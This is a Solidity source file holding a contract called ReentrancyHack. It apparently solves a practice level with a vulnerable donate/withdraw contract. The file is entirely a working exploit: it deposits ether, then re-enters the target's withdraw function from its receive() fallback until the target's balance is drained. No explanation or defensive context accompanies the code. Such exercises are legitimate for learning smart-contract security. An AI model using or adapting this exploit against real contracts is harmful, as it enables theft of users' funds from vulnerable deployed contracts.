// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/utils/math/Math.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint);
}

contract ReentrancyHack {
    address _targetAddress;

    constructor(address targetAddress) {
        _targetAddress = targetAddress;
    }

    function hack() public payable {
        IReentrance(_targetAddress).donate{value: msg.value}(address(this));
        IReentrance(_targetAddress).withdraw(msg.value);
    }

    receive() external payable {
        uint contractBalance = IReentrance(_targetAddress).balanceOf(address(this));
        uint targetBalance = address(_targetAddress).balance;
        if (targetBalance > 0 && contractBalance > 0) {
            IReentrance(_targetAddress).withdraw(Math.min(contractBalance, targetBalance));
        }
    }
}